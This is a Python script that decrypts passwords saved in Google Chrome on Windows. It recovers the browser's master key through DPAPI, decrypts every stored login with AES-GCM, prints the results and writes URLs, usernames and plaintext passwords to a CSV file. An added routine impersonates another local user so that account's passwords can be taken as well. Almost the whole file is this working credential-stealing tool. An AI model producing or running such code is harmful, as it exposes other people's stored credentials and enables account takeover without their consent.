#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# New imports for user impersonation
import getpass
import win32security
import win32con

def get_secret_key(chrome_path_local_state):
    try:
        #(1) Get secretkey from chrome local state
        with open(chrome_path_local_state, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print(str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    token = None
    try:
        # Determine the target user:
        # If a username is passed, use that as the target user profile.
        if len(sys.argv) > 1:
            target_user = sys.argv[1]
            user_profile = os.path.join("C:\\Users", target_user)
            # If target user is not the current user, attempt impersonation.
            if target_user.lower() != os.environ["USERNAME"].lower():
                print("Impersonating user:", target_user)
                target_password = getpass.getpass("Enter password for {}: ".format(target_user))
                # Use USERDOMAIN instead of COMPUTERNAME for the domain parameter 
                domain = os.environ.get("USERDOMAIN", os.environ["COMPUTERNAME"])
                token = win32security.LogonUser(
                    target_user,
                    domain,
                    target_password,
                    win32con.LOGON32_LOGON_INTERACTIVE,
                    win32con.LOGON32_PROVIDER_DEFAULT
                )
                win32security.ImpersonateLoggedOnUser(token)
        else:
            user_profile = os.environ["USERPROFILE"]

        # Construct paths based on the target user
        CHROME_PATH_LOCAL_STATE = os.path.normpath(os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"))
        CHROME_PATH = os.path.normpath(os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data"))

        # Create CSV file to store decrypted passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            #(1) Get secret key using the targeted Local State file path
            secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)
            # Search for user profile folders (Default or Profile*)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(os.path.join(CHROME_PATH, folder, "Login Data"))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url != "" and username != "" and ciphertext != "":
                            #(3) Decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d" % (index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
                            print("*" * 50)
                            #(4) Save entry to CSV 
                            csv_writer.writerow([index, url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    # Delete temporary login db file
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s" % str(e))
    finally:
        # Revert impersonation if performed.
        if token:
            win32security.RevertToSelf()